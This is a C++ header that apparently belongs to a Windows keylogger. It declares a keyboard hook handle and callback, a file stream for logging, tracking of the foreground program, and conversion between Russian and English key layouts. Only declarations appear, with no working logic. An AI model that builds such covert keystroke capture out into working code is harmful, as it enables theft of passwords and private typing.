#pragma once

#include "iostream"
#include "fstream"
#include "string"
#include "time.h"
#include "stdlib.h"
#include "map"
#include "io.h"
#include "fcntl.h"
#include <codecvt>
#include "resource.h"

HHOOK hook = NULL;

std::wofstream file;

std::locale loc(std::locale::classic(), new std::codecvt_utf8<wchar_t>);

const int MaxSize = 256;
char prevProg[MaxSize] = "";

const int RUS = 1049;
const int ENG = 1033;

int Save(int key);
void DataOut(char curKey, bool upper);
wchar_t GetRusLetter(char EngLetter);
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);